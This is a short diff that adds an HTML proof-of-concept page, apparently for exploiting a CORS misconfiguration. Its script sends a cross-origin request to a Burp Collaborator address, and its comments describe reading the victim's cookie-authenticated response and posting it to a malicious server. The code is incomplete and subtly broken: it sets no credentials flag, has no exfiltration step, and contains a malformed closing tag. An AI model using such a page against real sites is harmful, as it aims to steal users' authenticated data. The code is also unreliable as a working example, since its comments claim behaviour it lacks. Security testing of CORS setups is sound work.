@@ -1,0 +1,21 @@
+<html>
+	<head>
+		<title>TrustedSec CORS POC</title>
+	</head>
+	<body>
+		<h1>TrustedSec CORS POC</h>
+		<script>
+			var crossoriginget = new XMLHttpRequest();
+			//The target site with the bad CORS configuration
+			var url = 'https://356sosgr1esnpdm67uj3on5ppgv7jw.burpcollaborator.net';
+			crossoriginget.open('GET', url, true);
+			/*  This tells the browser to send the request with cookies;
+			    requires “Access-Control-Allow-Credentials = true” in
+			    response headers for this.responseText to be readable.  */
+			crossoriginget.send();
+			/*  Once the cross-origin request completes, attempt to read the
+			    response text and send it to the malicious server using an
+			    HTTP POST request.  */
+		</script>
+	</body>
+</html>
